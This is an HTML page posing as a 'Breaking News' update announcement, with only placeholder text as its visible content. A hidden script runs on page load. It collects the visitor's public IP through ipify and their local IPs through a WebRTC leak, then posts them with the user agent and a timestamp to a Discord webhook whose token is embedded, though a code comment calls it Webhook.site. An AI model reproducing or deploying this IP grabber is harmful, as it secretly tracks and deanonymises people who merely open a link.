<!DOCTYPE html>
<html>
<head>
<title>Latest News</title>
<style>
    body { font-family: Arial, sans-serif; background: #f4f4f4; color: #333; }
    .container { max-width: 800px; margin: 50px auto; padding: 20px; background: white; border-radius: 6px; }
    h1 { color: #0077cc; }
</style>
</head>
<body>
<div class="container">
    <h1>Breaking News: Major Update Released</h1>
    <p>Our team has just rolled out the latest update with exciting new features and security improvements. Stay tuned for more details as they come in.</p>
</div>

<script>
// 1. Put your Webhook.site URL here
const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1405831826639159347/99mrEbed5c_e7BzwKHiBx6_Dy1wehwjGVpZPdyEw7eEJPwZK5b5nOZH_KIy8zDALWGaS";

// Send data to Webhook.site
function logToWebhook(data) {
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    }).catch(err => console.error(err));
}

// Get Public IP
fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(data => {
        logToWebhook({
            type: "Public IP",
            value: data.ip,
            userAgent: navigator.userAgent,
            time: new Date().toLocaleString()
        });
    });

// Try Local IP via WebRTC
async function getLocalIPs(callback) {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel('');
    pc.onicecandidate = (event) => {
        if (!event.candidate) return;
        const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
        const ipMatch = regex.exec(event.candidate.candidate);
        if (ipMatch) callback(ipMatch[1]);
    };
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
}

getLocalIPs(ip => {
    logToWebhook({
        type: "Local IP",
        value: ip,
        userAgent: navigator.userAgent,
        time: new Date().toLocaleString()
    });
});
</script>
</body>
</html>
